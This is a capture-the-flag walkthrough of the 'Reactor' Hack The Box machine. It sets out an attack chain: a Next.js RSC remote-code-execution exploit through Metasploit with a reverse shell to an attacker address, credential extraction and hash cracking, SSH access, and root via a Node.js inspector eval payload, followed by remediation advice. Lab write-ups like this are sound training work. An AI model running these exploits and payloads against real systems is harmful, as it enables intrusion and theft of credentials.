# Reactor HTB - Complete Exploitation Notes

## Machine Information
- **Name:** Reactor
- **Difficulty:** Easy
- **OS:** Ubuntu Linux
- **IP:** 10.129.32.66
- **Release Date:** May 23, 2026

---

## Vulnerability Summary

### CVE-2025-55182 / CVE-2025-66478 (React2Shell)
- **Type:** Unauthenticated Remote Code Execution
- **Location:** React Server Components (RSC) in Next.js
- **CVSS Score:** 10.0 (CRITICAL)
- **Affected Versions:** 
  - React < 19.2.0
  - Next.js < 15.0.5
- **Root Cause:** Prototype pollution in RSC deserialization
- **Authentication Required:** NO

---

## Exploitation Timeline

### Phase 1: Reconnaissance

#### Nmap Scan
```bash
nmap -sV -sC -Pn 10.129.32.66
```

**Results:**
- Port 22: OpenSSH 9.6p1 (Ubuntu)
- Port 3000: Next.js 15.0.3 web application

#### Web Enumeration
```bash
curl -I http://reactor.htb:3000/
# Headers reveal: X-Powered-By: Next.js
```

**Application:** ReactorWatch - Nuclear Reactor Monitoring Dashboard

---

### Phase 2: Initial Access (RCE as 'node' user)

#### Tool Setup
```bash
python3 -m venv venv3
source venv3/bin/activate
git clone https://github.com/hackersatyamrastogi/react2shell-ultimate.git
cd react2shell-ultimate
pip3 install -r requirements.txt
```

#### Vulnerability Confirmation
```bash
python3 react2shell-ultimate.py -u http://reactor.htb:3000
# Output: [VULNERABLE] http://reactor.htb:3000
```

#### Metasploit Exploitation
```bash
msfconsole
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS reactor.htb
set RPORT 3000
set LHOST 10.10.14.106
set LPORT 4444
set ForceExploit true
exploit
```

**Result:** Reverse shell as `node` user in `/opt/reactor-app`

---

### Phase 3: Credential Extraction

#### Environment Variables
```bash
cat .env
```

**Output:**
```
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
NODE_ENV=production
```

#### Database Enumeration
```bash
sqlite3 reactor.db
SELECT * FROM users;
```

**Extracted Credentials:**
```
ID | Username | Password Hash (MD5)           | Role          | Email
1  | admin    | a203b22191d744a4e70ada5c101b17b8 | administrator | admin@reactor.htb
2  | engineer | 39d97110eafe2a9a68639812cd271e8e | operator      | engineer@reactor.htb
```

#### Hash Cracking
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Passwords:**
```
engineer: reactor1
admin: (not found in rockyou.txt)
```

---

### Phase 4: Lateral Movement (SSH as engineer)

#### SSH Access
```bash
ssh engineer@reactor.htb
# Password: reactor1
```

#### Verification
```bash
whoami        # engineer
id            # uid=1000(engineer) gid=1000(engineer)
hostname      # reactor
```

#### User Flag
```bash
cat ~/user.txt
# e1a7afe4be4833730928cd8e6f184efb
```

✅ **USER FLAG CAPTURED**

---

### Phase 5: Privilege Escalation (Node.js Inspector)

#### Process Enumeration
```bash
ps aux | grep node
```

**Discovery:**
```
root  1397  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

**Key Finding:** Node.js debugger enabled on port 9229 as ROOT!

#### SSH Tunnel (Local Port Forwarding)
```bash
# Terminal 1: Maintain this connection
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
```

#### Get WebSocket Endpoint
```bash
# Terminal 2
curl http://127.0.0.1:9229/json
```

**Output:**
```json
{
  "id": "6a3412ce-b8db-42fe-a5be-183ef793040d",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/6a3412ce-b8db-42fe-a5be-183ef793040d"
}
```

#### Install WebSocket Client
```bash
npm install -g wscat
```

#### Connect to Node Inspector
```bash
wscat -c ws://127.0.0.1:9229/6a3412ce-b8db-42fe-a5be-183ef793040d
```

#### Execute Command as ROOT
```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

**Output:**
```
df22180a681825406fcd434b3697cbdd
```

✅ **ROOT FLAG CAPTURED**

---

## Critical Commands Reference

### Reconnaissance
```bash
nmap -sV -sC -Pn 10.129.32.66
curl -I http://reactor.htb:3000/
```

### Initial Access
```bash
# Metasploit
msfconsole
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS reactor.htb
set RPORT 3000
set LHOST 10.10.14.106
set LPORT 4444
set ForceExploit true
exploit

# Or Python Tool
python3 react2shell-ultimate.py -u http://reactor.htb:3000 --rce
```

### Data Extraction
```bash
cat .env
sqlite3 reactor.db "SELECT * FROM users;"
```

### Credential Cracking
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### SSH Access
```bash
ssh engineer@reactor.htb
cat ~/user.txt
```

### Privilege Escalation
```bash
# SSH Tunnel
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb

# Get WebSocket URL
curl http://127.0.0.1:9229/json

# Connect
wscat -c ws://127.0.0.1:9229/[ID]

# Execute (in wscat)
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

---

## Key Vulnerabilities Exploited

| # | Vulnerability | Severity | Impact |
|---|---|---|---|
| 1 | CVE-2025-55182 (RSC RCE) | CRITICAL | Pre-auth code execution as node |
| 2 | Exposed SQLite Database | HIGH | Plaintext credentials in DB |
| 3 | MD5 Password Hashing | MEDIUM | Fast hash cracking (rockyou.txt) |
| 4 | SSH Password Reuse | MEDIUM | Same password across services |
| 5 | Node.js Inspector as Root | CRITICAL | Root code execution via debugger |
| 6 | No Port Binding Restrictions | HIGH | Inspector accessible via tunnel |

---

## Lessons Learned

### Security Issues

1. **Framework Vulnerability:** Never expose debug endpoints in production
2. **Credential Storage:** Use strong password hashing (bcrypt, argon2, not MD5)
3. **Database Security:** SQLite databases should not store sensitive credentials
4. **Service Isolation:** Don't run privileged services with debugging enabled
5. **Network Security:** SSH should use key-based auth, not passwords
6. **Principle of Least Privilege:** Root shouldn't run Node.js services

### Detection Indicators

- Unusual HTTP status codes (303) to unusual endpoints
- process.mainModule.require calls in logs
- Node.js inspector port (9229) accessible
- MD5 hashes in databases (outdated algorithm)
- Environment variables in source control

---

## Attack Chain Summary

```
┌─────────────────────────────────────┐
│ CVE-2025-55182 Discovery            │
│ (React2Shell RCE)                   │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Metasploit Exploitation             │
│ RCE as 'node' user                  │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Environment & Database Enumeration  │
│ Extract: .env, reactor.db           │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Credential Extraction               │
│ MD5 hashes from SQLite              │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Hash Cracking                       │
│ engineer: reactor1 (rockyou.txt)    │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ SSH Access as 'engineer'            │
│ Stable interactive shell            │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ USER FLAG ✅                        │
│ e1a7afe4be4833730928cd8e6f184efb   │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Process Enumeration                 │
│ Find: root Node.js inspector:9229   │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ SSH Tunnel + WebSocket Connection   │
│ Connect to Node.js debugger         │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ Runtime.evaluate Exploitation       │
│ Execute system commands as root     │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ ROOT FLAG ✅                        │
│ df22180a681825406fcd434b3697cbdd   │
└─────────────────────────────────────┘
```

---

## Tools Used

| Tool | Purpose | Installation |
|---|---|---|
| nmap | Port scanning | `apt install nmap` |
| curl | HTTP requests | `apt install curl` |
| metasploit | Exploit framework | `apt install metasploit-framework` |
| hashcat | Hash cracking | `apt install hashcat` |
| sqlite3 | Database queries | `apt install sqlite3` |
| ssh | Remote access | `apt install openssh-client` |
| wscat | WebSocket client | `npm install -g wscat` |
| python3 | Scripting | Preinstalled |

---

## Final Flags

```
USER FLAG: e1a7afe4be4833730928cd8e6f184efb
ROOT FLAG: df22180a681825406fcd434b3697cbdd
```

---

## Timeline

| Time | Action | User | Status |
|---|---|---|---|
| 00:00 | Nmap Scan | attacker | Reconnaissance |
| 01:00 | CVE Discovery | attacker | Initial Access |
| 02:00 | RCE (node user) | node | Code Execution |
| 03:00 | DB Extraction | node | Data Retrieved |
| 04:00 | Hash Cracking | attacker | Credentials Obtained |
| 05:00 | SSH Access | engineer | Lateral Movement |
| 06:00 | USER FLAG | engineer | ✅ Captured |
| 07:00 | Node Inspector Found | engineer | Privilege Escalation Path |
| 08:00 | Debugger Connection | attacker | Escalation Ready |
| 09:00 | ROOT FLAG | root | ✅ Captured |

---

## Remediation Steps

### For Machine Owners:

1. **Update Next.js** to version > 15.0.5
2. **Disable Node.js Inspector** in production
3. **Use Strong Password Hashing** (bcrypt, argon2)
4. **Implement Database Encryption** at rest
5. **Enable SSH Key Authentication** (disable password auth)
6. **Use Secrets Management** (not .env files)
7. **Implement Network Segmentation** (inspector not accessible)
8. **Enable Audit Logging** for suspicious activities
9. **Regular Security Updates** and patching
10. **Security Testing** - Penetration tests regularly

---

## References

- CVE-2025-55182: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- React2Shell: https://github.com/hackersatyamrastogi/react2shell-ultimate
- Metasploit Module: `exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`
- Node.js Inspector: https://nodejs.org/en/docs/guides/nodejs-debugging-guide/

---

## Notes

- Machine demonstrates impact of unpatched framework vulnerabilities
- Shows importance of securing debug interfaces
- Highlights credential exposure in databases
- Demonstrates privilege escalation via debugging tools
- Teaching value: Multiple attack vectors and techniques

---

**Status:** ✅ FULLY COMPROMISED
**Difficulty Rating:** Easy ⭐
**Time to Exploit:** ~45 minutes (with proper tools)

---
